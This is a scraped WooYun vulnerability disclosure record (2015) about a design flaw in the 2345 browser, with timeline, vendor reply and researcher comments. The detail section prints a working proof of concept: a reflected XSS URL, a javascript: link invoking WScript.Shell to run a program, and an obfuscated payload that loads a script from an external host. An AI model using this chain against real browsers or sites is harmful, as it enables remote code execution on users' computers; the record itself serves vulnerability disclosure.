{"id": 7501, "wybug_id": "wooyun-2015-0113636", "wybug_title": "2345浏览器设计缺陷可导致远程代码执行", "wybug_corp": "2345网址导航", "wybug_author": "梧桐雨", "wybug_date": "2015-05-12 13:40", "wybug_open_date": "2015-08-10 17:12", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向公众公开  简要描述： 简单暴力无限制。20rank毫无违和感。 详细说明：  2345 浏览器更新到最新版：\n\n目前的2345浏览器，依旧是允许javascript://伪协议来定义主页神马的，但是这些都不是本文的重点。重点是一个比较严重的设计缺陷导致命令执行。在之前提交的案例之中，我摸索着怎么去调试一些poc。在我测试2345网络收藏夹的时候，惊讶的发现，我里面的链接居然是可以执行命令的：\n\n也就是说，此处我们并不是传统的2345://，也不是传统的特权域，但是因为Javascript://协议的关系，导致直接调用2345://协议，即本地域，去执行代码，这样一来，危害就很大了。但是经过详细测试之后，发现并不是所有域都能这么做，模糊测试之后，发现*.2345.com下的xss可以实现这样的功能。因此我们需要找到.2345.com域的一个xss，这对我们来说并不是什么难事。http://skin.chrome.2345.com/?a=%3Cimg%20src=1%20onerror=alert(1)%3E此处xss会被chrome拦截，而2345浏览器默认配置不会拦截：\n\n特权域有了，知道该怎么做了。构造缺陷代码：\nvar f=document.createElement(\"a\");f.href='javascript:WSH=new ActiveXObject(\"WScript.Shell\");WSH.run(\"calc.exe\")';document.body.appendChild(f);f.click();\n具体可看：http://wutongyu.info/alert.js虽然是a标签点击才能触发，但是我们完全可以通过js的click()函数实现自动触发。变形之后生成链接：http://skin.chrome.2345.com/?a=%3Cimg%20src=1%20onerror=eval('window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,119,117,116,111,110,103,121,117,46,105,110,102,111,47,97,108,101,114,116,46,106,115);document.body.appendChild(window.s)')%3E用最新版2345浏览器访问上述url：\n\n简单暴力，打完收工。   漏洞证明：  用最新版2345浏览器访问上述url：\n\n   修复方案：  重新考量javascript://协议在你们浏览器中的危害，任意网站调用a href=\"javascript://\"的时候应该在a当前网站打开。修补此处xss，不过似乎有点治标不治本。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-05-12 17:11 厂商回复： 感谢您对2345的关注，此问题会在后续版本中修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-12 13:42 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  浏览器算通用~给你双倍吧~    \n     2015-05-12 15:00 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  和二哥开始了浏览器专辑。    \n     2015-05-12 17:14 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  一个没有任何条件的远程代码执行你们就给3rank？负责2345帐号的真的懂安全吗？    \n     2015-05-16 04:44 |    \t\tcrazykb \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | The quieter you become, the more you are...)\t\t \n  真抠    \n     2015-06-21 15:53 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  http://www.tudou.com/programs/view/oNlFNGeOgZQ/    \n     2015-08-13 08:43 |    \t\t小杨 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | 。)\t\t \n  一看标题就在想洞主为何要用这个浏览器    \n     2015-08-13 16:59 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  @梧桐雨 这么不上档次的山寨浏览器就别测了以后，辛辛苦苦弄的洞，完事还不够厂家恶心人的。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}